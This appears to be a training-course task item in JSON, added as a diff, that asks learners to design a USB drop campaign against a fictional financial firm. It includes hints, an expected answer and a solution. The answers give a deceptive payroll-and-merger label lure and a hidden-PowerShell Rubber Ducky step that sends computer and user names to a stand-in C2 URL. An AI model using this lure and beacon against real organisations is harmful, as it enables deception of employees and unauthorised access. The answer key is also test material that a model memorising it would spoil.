@@ -1,0 +1,17 @@
+{
+    "id": "task2",
+    "chapterId": "ch_7",
+    "title": "Design a USB Baiting Campaign",
+    "description": "Create a comprehensive USB drop plan for a simulated Red Team engagement.",
+    "estimatedMinutes": 20,
+    "problemStatement": "# Scenario: The Financial Firm\n\nYou are a Red Teamer tasked with testing **Apex Financial's** susceptibility to USB drop attacks. Your goal is to achieve **plug-in events** and log them to your C2 server.\n\n**Recon Data:**\n- Apex Financial has 500 employees in a suburban office park.\n- The parking lot has designated spaces for **Executives** near the front.\n- Employees often eat lunch in the **courtyard picnic area**.\n- The company recently completed a **merger** with a smaller firm.\n- HR sent an email last week about **updating direct deposit information**.\n\n**Task:** Design a USB drop campaign covering:\n1. **Label Strategy:** Write the exact text that would be printed on the USB label (or attached note).\n2. **Placement Location:** Where will you drop the drives? (Be specific).\n3. **Time of Drop:** When will you deploy them?\n4. **Payload Type:** Which attack vector will you use? Why?\n5. **'Phone Home' Script Description:** What will the payload do to prove access without causing harm?\n\n**Output Format:**\n```\n1. Label Strategy: [Exact text]\n2. Placement Location: [Location and reasoning]\n3. Time of Drop: [Time and reasoning]\n4. Payload Type: [Vector and reasoning]\n5. 'Phone Home' Script Description: [Description]\n```",
+    "hints": [
+        "Hint 1: Use the merger or direct deposit themes for the label (relevance).",
+        "Hint 2: Drop near executive parking or courtyard for high-value targets.",
+        "Hint 3: Early morning ensures drives are found during work hours.",
+        "Hint 4: Rubber Ducky or BadUSB? Consider stealth vs. ease of deployment.",
+        "Hint 5: A simple web request to a C2 server with computer name is sufficient proof."
+    ],
+    "expectedOutput": "1. Label: 'CONFIDENTIAL: Merger Integration - Updated Direct Deposit Info.xlsx' printed on a sticker.\n2. Location: Near executive parking spaces and on picnic tables in courtyard (high traffic of decision-makers and general staff).\n3. Time: 7:30 AM (before employees arrive, to be found early in the day).\n4. Payload: Rubber Ducky with safe 'phone home' script. Simple, reliable, and no storage files to arouse suspicion.\n5. Script: Opens PowerShell hidden, fetches a URL like https://c2-server/ping?pc=%COMPUTERNAME%&user=%USERNAME%, then exits. Logs the event on the server.",
+    "solutionCode": "1. Label: 'CONFIDENTIAL: Post-Merger Direct Deposit Verification - HR Use Only'\n2. Placement: Executive parking area (target C-suite) and courtyard lunch tables (target broad employee base).\n3. Time: 7:00 AM, before morning rush.\n4. Payload: Rubber Ducky (HID emulation) - reliable, fast execution, no file-based AV detection.\n5. 'Phone Home': DuckyScript types a PowerShell command to Invoke-WebRequest to a controlled server with environment variables (computername, username) as parameters, then closes the window."
+}
